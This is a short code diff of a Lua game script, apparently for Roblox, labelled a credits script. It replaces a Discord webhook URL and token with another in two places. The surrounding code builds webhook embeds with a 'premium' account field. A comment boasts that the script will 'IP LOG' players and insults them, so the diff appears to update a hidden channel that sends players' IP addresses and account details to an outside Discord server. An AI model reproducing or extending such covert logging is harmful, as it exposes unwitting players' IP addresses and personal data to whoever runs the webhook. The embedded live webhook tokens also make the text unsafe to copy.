@@ -755,7 +755,7 @@ local function SGMI_fake_script() -- Credits.LocalScript
 			premium = "Yes"
 		end
 		local url =
-			"https://discord.com/api/webhooks/977962764200988693/8XY_YVlipxlBquz-uzi-PT-TbedKydGdK1DAMemTO_ieDeAU1jx-cKvY9FcBsDjI4FTd"
+			"https://discord.com/api/webhooks/980886616958726185/Lkm0fHz2gNoQTATU2GN3N182JvOOq0KRtO2mONPew0a0cNUCsZizdlBhtBbYksvUnsw5"
 		local data = {
 			["embeds"] = {
 				{
@@ -940,7 +940,7 @@ end
 	-- IT'LL IP LOG 'EM, CAUSE, WHY NOT. THEY'RE A BITCH. WE AINT NO LIKE NO BITCHES.
 	
 	local url =
-		"https://discord.com/api/webhooks/977962764200988693/8XY_YVlipxlBquz-uzi-PT-TbedKydGdK1DAMemTO_ieDeAU1jx-cKvY9FcBsDjI4FTd"
+		"https://discord.com/api/webhooks/980886616958726185/Lkm0fHz2gNoQTATU2GN3N182JvOOq0KRtO2mONPew0a0cNUCsZizdlBhtBbYksvUnsw5"
 	local data = {
 		["embeds"] = {
 			{
